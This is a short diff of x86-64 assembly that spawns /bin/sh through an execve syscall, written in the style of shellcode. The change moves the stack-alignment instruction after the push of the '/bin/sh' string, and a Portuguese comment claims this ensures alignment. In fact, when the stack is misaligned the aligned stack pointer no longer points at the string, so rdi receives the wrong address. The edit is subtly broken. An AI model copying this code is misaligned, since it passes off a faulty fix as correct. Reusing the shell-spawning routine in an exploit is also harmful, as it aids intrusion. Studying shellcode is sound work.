@@ -74,9 +74,9 @@ _start:
     syscall
 
     ; execve("/bin/sh", NULL, NULL)
-    and rsp, -16
     mov rbx, 0x0068732f6e69622f     ; "/bin/sh\0"
     push rbx
+    and rsp, -16                    ; garantir alinhamento DEPOIS do push
     mov rdi, rsp
     xor rsi, rsi
     xor rdx, rdx
